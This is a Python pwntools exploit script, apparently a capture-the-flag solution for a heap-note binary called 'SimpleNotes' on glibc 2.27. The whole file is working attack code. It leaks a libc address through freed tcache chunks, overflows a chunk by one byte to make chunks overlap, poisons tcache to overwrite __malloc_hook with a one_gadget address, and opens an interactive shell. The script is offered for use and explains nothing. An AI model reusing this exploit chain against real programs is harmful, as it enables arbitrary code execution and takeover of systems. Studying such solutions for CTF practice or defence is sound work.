from pwn import *
from icecream import ic

elf = exe = ELF("./SimpleNotes_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True
context.terminal = ['/mnt/c/Windows/system32/cmd.exe', '/c', 'start', 'wt.exe', '-w', '0', 'split-pane', '-d', '.', 'wsl.exe', '-d', 'Ubuntu', 'bash', '-c']
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0xd45
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def gad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def i(): return io.interactive()

io = start()

def create_note(id, size, note):
    ru(">> ")
    sl("1")
    ru("Enter the id of note: ")
    sl(f"{id}")
    ru("Enter the size of note: ")
    sl(f"{size}")
    ru("Enter the note: ")
    sl(note)

def edit_note(id, size, note):
    ru(">> ")
    sl("2")
    ru("Enter the id of note: ")
    sl(f"{id}")
    ru("Enter the size of note: ")
    sl(f"{size}")
    ru("Enter the note: ")
    s(f"{note}")    

def delete_note(id):
    ru(">> ")
    sl("3")
    ru("Enter the id of note: ")
    sl(f"{id}")

def read_note(id):
    ru(">> ")
    sl("4")
    ru("Enter the id of note: ")
    sl(f"{id}")
    ru('bbbb')
    leak = u64(re(6).ljust(8, b'\x00'))
    return leak

def exit_note():
    ru(">> ")
    sl("5")

for i in range(10):
    create_note(i, 0xf8, 'a')

for i in range(10):
    delete_note(i)

for i in range(7):
    create_note(i, 0xf8, 'a')

create_note(7, 0xf8, 'aaaabbbb')
create_note(8, 0xf8, 'aaaabbbb')
create_note(9, 0xf8, 'aaaabbbb')
libc.address = read_note(7) - 0x3ebc0a
ic(hex(libc.address))

delete_note(7)
delete_note(8)
delete_note(0)
delete_note(1)
delete_note(3)
delete_note(2)
delete_note(4)

create_note(0, 0xf8, 'e'*8)
create_note(1, 0xf8, 'f'*8)
create_note(2, 0xf8, "0"*0xf8)
edit_note(2, 0xf9, "0"*0xf8+'\x81')
create_note(3, 0xf8, 'g'*8)
create_note(4, 0xf8, 'h'*8)

delete_note(1)
delete_note(3)

one_gadget = libc.address+0x4f29e
create_note(1, 0x178, b"0"*0xf8 + b"1"*8 + p64(libc.symbols["__malloc_hook"]).replace(b"\x00", b""))
create_note(3, 0xf8, 'a'*8)
create_note(5, 0xf8, p64(one_gadget).replace(b"\x00", b""))
create_note(7, 30, 'a')
io.interactive()
